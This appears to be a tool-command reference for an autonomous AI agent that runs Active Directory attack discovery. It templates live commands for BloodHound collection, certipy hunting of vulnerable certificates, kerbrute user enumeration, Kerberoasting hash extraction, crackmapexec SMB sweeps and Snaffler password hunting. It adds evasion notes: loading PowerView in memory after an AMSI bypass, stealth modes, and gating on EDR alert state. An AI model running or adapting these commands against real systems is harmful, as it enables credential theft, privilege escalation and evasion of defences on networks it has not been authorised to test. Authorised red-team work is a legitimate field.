# Discovery — Tool commands reference

Templated commands the `DiscoveryAgent` renders and dispatches via the
Execution Layer. Placeholders:

- `{{ memory.path.dots }}` — resolved against typed session memory.
- `{{ artifact.path }}` — allocated by the ToolRunner per step.
- Filter pipes (`| as_cme_secret`, `| as_impacket_secret`, `| ips`) implemented
  in the agent runtime; see `src/execution/template_filters.py`.

## Contents
- sharphound, bloodhound-python (D1)
- certipy (D3)
- powerview (D2, D6, D9, D10, D15, D16)
- crackmapexec (D4, D5, D8, D11)
- kerbrute, impacket-getuserspns (D9)
- snaffler (D4), adidnsdump (D13), group3r (D10)
- nmap (D8) — only when masscan-pre-scoped
- roadrecon / azurehound (D14)
- powerupsql, lapstoolkit (D17, D20)

---

## `sharphound`  (D1)

```yaml
tool: sharphound
opsec: moderate
preconditions:
  - "credentials.any(usable_for contains 'ldap')"
commands:
  - id: full_collection
    cmd: |
      SharpHound.exe -c All -d {{ context.scope.domains[0] }} \
        --zipfilename {{ artifact.path }}/sh.zip \
        --randomizefilenames --prettyprint
    expected_artifacts: ["sh*.zip"]
    parser: parsers.sharphound
    on_success:
      - "ingest into ad_graph"
      - "append finding: technique=bloodhound_collection priority=critical"
    on_failure:
      fallback: stealth_collection
  - id: stealth_collection
    cmd: |
      SharpHound.exe -c DCOnly --stealth -d {{ context.scope.domains[0] }} \
        --zipfilename {{ artifact.path }}/sh.zip
    parser: parsers.sharphound
```

## `bloodhound-python`  (D1 fallback)

```yaml
tool: bloodhound-python
opsec: moderate
preconditions:
  - "credentials.any(secret_type in ['password','nt_hash'])"
commands:
  - id: linux_full
    cmd: |
      bloodhound-python -u {{ creds.primary.username }} \
        {{ creds.primary | as_auth_flag }} \
        -d {{ context.scope.domains[0] }} \
        -ns {{ hosts.first(role='DC').ip }} \
        -c All --zip
    expected_artifacts: ["*_bloodhound.zip"]
    parser: parsers.sharphound
```

## `certipy`  (D3)

```yaml
tool: certipy
opsec: stealth
commands:
  - id: find_vulnerable
    cmd: |
      certipy find -u '{{ creds.primary.username }}@{{ context.scope.domains[0] }}' \
        {{ creds.primary | as_certipy_secret }} \
        -dc-ip {{ hosts.first(role='DC').ip }} \
        -vulnerable -enabled -stdout
    parser: parsers.certipy
    on_success:
      - "append findings per ESC id"
      - "set pivot hint to escalating-privileges if ESC1/4/6/8 present"
```

## `powerview`  (D2, D6, D9, D10, D15, D16)

```yaml
tool: powerview
opsec: moderate
notes: "Load via in-memory IEX after AMSI bypass; never drop to disk."
commands:
  - id: kerberoastable
    cmd: "Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset | ConvertTo-Json -Depth 3"
    parser: parsers.powerview_json
  - id: asreproastable
    cmd: "Get-DomainUser -PreauthNotRequired -Properties samaccountname,pwdlastset | ConvertTo-Json -Depth 3"
    parser: parsers.powerview_json
  - id: password_policy
    cmd: "Get-DomainPolicyData | ConvertTo-Json -Depth 4"
    parser: parsers.powerview_json
  - id: unconstrained_delegation
    cmd: "Get-DomainComputer -Unconstrained | Select samaccountname,operatingsystem | ConvertTo-Json"
    parser: parsers.powerview_json
  - id: gpo_writable
    cmd: "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write|GenericAll'} | ConvertTo-Json -Depth 3"
    parser: parsers.powerview_json
  - id: object_acl
    cmd: "Get-DomainObjectAcl -ResolveGUIDs -Identity '{{ target.distinguished_name }}' | ConvertTo-Json -Depth 3"
    parser: parsers.powerview_json
```

## `crackmapexec`  (D4, D5, D8, D11)

```yaml
tool: crackmapexec
opsec: moderate
commands:
  - id: smb_sweep
    cmd: |
      crackmapexec smb {{ context.scope.subnets_allow[0] }} \
        -u {{ creds.primary.username }} {{ creds.primary | as_cme_secret }} \
        --json
    parser: parsers.cme
    on_success: ["populate hosts[] with os, signing, smbv1 flags"]
  - id: loggedon_users
    cmd: |
      crackmapexec smb {{ hosts | ips }} \
        -u {{ creds.primary.username }} {{ creds.primary | as_cme_secret }} \
        --loggedon-users --json
    parser: parsers.cme
  - id: shares
    cmd: |
      crackmapexec smb {{ hosts | ips }} \
        -u {{ creds.primary.username }} {{ creds.primary | as_cme_secret }} \
        --shares --json
    parser: parsers.cme
```

## `kerbrute`  (D9)

```yaml
tool: kerbrute
opsec: stealth
commands:
  - id: user_enum
    cmd: |
      kerbrute userenum --dc {{ hosts.first(role='DC').ip }} \
        -d {{ context.scope.domains[0] }} \
        {{ artifact.path }}/userlist.txt
    parser: parsers.kerbrute
```

## `impacket-getuserspns`  (D9)

```yaml
tool: impacket-getuserspns
opsec: stealth
commands:
  - id: roast
    cmd: |
      GetUserSPNs.py {{ context.scope.domains[0] }}/{{ creds.primary.username }} \
        {{ creds.primary | as_impacket_secret }} \
        -dc-ip {{ hosts.first(role='DC').ip }} \
        -request -outputfile {{ artifact.path }}/spn_hashes.txt
    parser: parsers.kerberoast_hashes
    on_success:
      - "store hashes as credentials[] with secret_type=krb5tgs"
      - "pivot hint = accessing-credentials (kerberoast_offline_crack)"
```

## `snaffler`  (D4)

```yaml
tool: snaffler
opsec: moderate
commands:
  - id: scan_shares
    cmd: "Snaffler.exe -s -y -o {{ artifact.path }}/snaffler.tsv"
    parser: parsers.snaffler
    on_success: ["append findings per high-severity hit (passwords, certs, kdbx)"]
```

## `adidnsdump`  (D13)

```yaml
tool: adidnsdump
opsec: stealth
commands:
  - id: dump
    cmd: |
      adidnsdump -u '{{ context.scope.domains[0] }}\{{ creds.primary.username }}' \
        {{ creds.primary | as_adidnsdump_secret }} \
        {{ hosts.first(role='DC').ip }} -r --print-zones
    parser: parsers.adidnsdump
```

## `group3r`  (D10)

```yaml
tool: group3r
opsec: stealth
commands:
  - id: audit
    cmd: "Group3r.exe -f {{ artifact.path }}/group3r.log -s"
    parser: parsers.group3r
```

## `nmap`  (D8 — only when masscan-pre-scoped)

```yaml
tool: nmap
opsec: loud
commands:
  - id: dc_services
    cmd: |
      nmap -Pn -n -sS -p 53,88,135,139,389,445,464,636,3268,3269,5985 \
        --open -oX {{ artifact.path }}/nmap.xml \
        {{ context.scope.subnets_allow | join(' ') }}
    parser: parsers.nmap_xml
    opsec_gate: "block if opsec_state.edr_hot"
```

## `roadrecon` / `azurehound`  (D14 — hybrid only)

```yaml
tool: roadrecon
opsec: stealth
preconditions:
  - "context.scope.azure_tenant is not null"
commands:
  - id: gather
    cmd: |
      roadrecon auth --username {{ creds.primary.username }}@{{ context.scope.azure_tenant }} \
        --password '{{ creds.primary | as_plaintext }}' && \
      roadrecon gather -f {{ artifact.path }}/roadrecon.db
    parser: parsers.roadtools
```

## `powerupsql`  (D17) / `lapstoolkit`  (D20)

```yaml
tool: powerupsql
opsec: moderate
commands:
  - id: instance_discovery
    cmd: "Get-SQLInstanceDomain | Get-SQLServerInfo | ConvertTo-Json"
    parser: parsers.json

tool: lapstoolkit
opsec: stealth
commands:
  - id: find_readers
    cmd: "Find-LAPSDelegatedGroups | ConvertTo-Json; Get-LAPSComputers | ConvertTo-Json"
    parser: parsers.json
```
